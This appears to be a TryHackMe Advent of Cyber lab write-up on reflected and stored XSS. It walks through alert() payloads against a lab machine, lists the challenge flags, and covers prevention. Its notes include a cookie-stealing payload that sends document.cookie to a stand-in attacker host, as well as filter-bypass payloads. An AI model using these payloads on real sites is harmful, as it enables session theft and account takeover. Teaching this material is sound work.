# Merry XSSMas

Learn about Cross-Site Scripting (XSS) vulnerabilities, understand the difference between Reflected and Stored XSS attacks, and discover how to exploit and prevent them in web applications.

## Solution:

**Step 1: Understanding XSS Basics**

- Navigated to the web application at `http://MACHINE_IP`
- Reviewed McSkidy's secure message portal interface
- Learned that XSS allows attackers to inject malicious JavaScript code into input fields
- Two main types focused on today:
  - **Reflected XSS**: Payload executed immediately in response
  - **Stored XSS**: Payload saved on server and executed for all users

![McSkidy's message portal homepage](https://via.placeholder.com/800x400?text=Message+Portal+Interface)

**Step 2: Exploiting Reflected XSS**

- Identified the search functionality as a potential injection point
- Checked browser DevTools (Network tab) to confirm search uses `/?search=` parameter
- Crafted a simple XSS payload to test vulnerability:

```
<script>alert('Reflected Meow Meow')</script>
```

- **Method 1: Using Search Bar**
  - Entered payload directly into search bar
  - Clicked "Search Messages"
  - Alert box appeared, confirming reflected XSS vulnerability

- **Method 2: Direct URL Manipulation**
  - Navigated to: `http://10.48.141.95/?search=<script>alert('test')</script>`
  - Alert executed immediately

![Reflected XSS alert popup](https://via.placeholder.com/800x400?text=Reflected+XSS+Alert)

**What happened:**
- Search input reflected directly in results without encoding
- Browser interpreted HTML/JavaScript as executable code
- Alert box demonstrated successful XSS execution

**System Logs Verification:**
- Checked "System Logs" tab at bottom of page
- Confirmed the injected script was logged and executed

![System logs showing XSS payload](https://via.placeholder.com/800x400?text=System+Logs+XSS)

**Flag Retrieved:** `THM{Evil_Bunny}` (displayed in alert or decoded from base64)

**Step 3: Exploiting Stored XSS**

- Navigated to the message form (different from search - this persists on server)
- Entered malicious payload in the message field:

```
<script>alert('Stored Meow Meow')</script>
```

- Filled in required fields (name, email, message)
- Clicked "Send Message" button
- Payload stored in database on the server

![Message form with XSS payload](https://via.placeholder.com/800x400?text=Message+Form+XSS)

**Verification:**
- Reloaded the page
- Alert appeared automatically without any user action
- Every page load triggered the stored script
- This demonstrates persistence - affects all users viewing the page

![Stored XSS alert on page reload](https://via.placeholder.com/800x400?text=Stored+XSS+Alert)

**Flag Retrieved:** `THM{Evil_Stored_Egg}` (displayed in alert or decoded from base64)

**Step 4: Understanding the Impact**

Both vulnerabilities confirmed that the site lacks proper input sanitization:
- Search functionality vulnerable to **Reflected XSS**
- Message submission vulnerable to **Stored XSS**
- Malicious scripts execute in user browsers with full access to:
  - Session cookies
  - User credentials
  - Page content and DOM manipulation

## Flags/Answers:

```
XSS type requiring server persistence: stored
Reflected XSS flag: THM{Evil_Bunny}
Stored XSS flag: THM{Evil_Stored_Egg}
```

## Concepts learnt:

* **Cross-Site Scripting (XSS)**: A web vulnerability allowing attackers to inject malicious JavaScript into web pages viewed by other users. The browser executes the script as if it were legitimate code from the website.

* **Reflected XSS**: Non-persistent XSS where malicious script is immediately reflected back in the HTTP response. Typically exploited via phishing - attacker tricks victim into clicking a malicious URL containing the payload. Affects individual victims.

* **Stored XSS (Persistent XSS)**: Malicious script is permanently stored on the target server (database, comment field, forum post). Executes automatically for every user who views the affected page. More dangerous as it's a "set-and-forget" attack affecting multiple users.

* **Input Validation**: The process of checking user input to ensure it contains only expected, safe data. Lack of proper validation allows attackers to inject executable code.

* **Output Encoding**: Converting special characters into their HTML entity equivalents so browsers render them as text instead of code. Prevents browsers from interpreting malicious input as executable scripts.

* **innerHTML vs textContent**: 
  - `innerHTML` allows injecting raw HTML/JavaScript (dangerous)
  - `textContent` treats everything as plain text (safe)

* **Cookie Security Attributes**:
  - `HttpOnly`: Prevents JavaScript from accessing cookies
  - `Secure`: Ensures cookies sent only over HTTPS
  - `SameSite`: Prevents cookies from being sent in cross-site requests

* **XSS Attack Vectors**: Common injection points include search bars, comment sections, contact forms, user profiles, and any input field that reflects user data.

## Notes:

* **Key differences between Reflected and Stored XSS**:
  
  | Aspect | Reflected XSS | Stored XSS |
  |--------|--------------|------------|
  | Persistence | Temporary | Permanent |
  | Storage | Not stored | Stored in database |
  | Targets | Individual victims | All users viewing page |
  | Delivery | Via malicious link | Automatic on page load |
  | Detection | Easier (one-time) | Harder (persistent threat) |

* **Testing methodology**:
  1. Identify input fields (search bars, forms, URLs)
  2. Test with simple payloads like `<script>alert('test')</script>`
  3. Check if script executes or is sanitized
  4. Try different encoding/obfuscation if blocked
  5. Test persistence by reloading page

* **Base64 encoding in payloads**: The example used `atob("VEhNe0V2aWxfQnVubnl9")` which decodes base64 strings. This is often used to obfuscate payloads and bypass basic filters.

* **Real-world XSS exploitation**:
  - Steal session cookies: `<script>fetch('http://attacker.com/?cookie='+document.cookie)</script>`
  - Keylogging: Capture keystrokes and send to attacker
  - Phishing: Display fake login forms
  - Page defacement: Modify page content
  - Privilege escalation: If admin views infected page, attacker gains admin access

* **XSS Prevention best practices**:
  1. **Input Sanitization**: Remove/escape dangerous characters
  2. **Output Encoding**: Encode data before displaying
  3. **Content Security Policy (CSP)**: Restrict script sources
  4. **Use security libraries**: DOMPurify, OWASP Java Encoder
  5. **Validate on server-side**: Never trust client-side validation

* **Testing tools and resources**:
  - XSS cheat sheets for more advanced payloads
  - Browser DevTools Network tab to analyze requests
  - Burp Suite for intercepting and modifying requests
  - OWASP ZAP for automated XSS scanning

* **Common XSS bypass techniques**:
  - Case variation: `<ScRiPt>`
  - Different event handlers: `<img src=x onerror=alert(1)>`
  - Encoding: URL encoding, HTML entities, Unicode
  - Alternative tags: `<svg>`, `<iframe>`, `<body>`

## Resources:

* [TryHackMe - Advent of Cyber 2025 Day 11](https://tryhackme.com/r/room/adventofcyber2025)
* [TryHackMe - Intro to Cross-Site Scripting](https://tryhackme.com/room/xss)
* [OWASP - Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
* [OWASP - XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
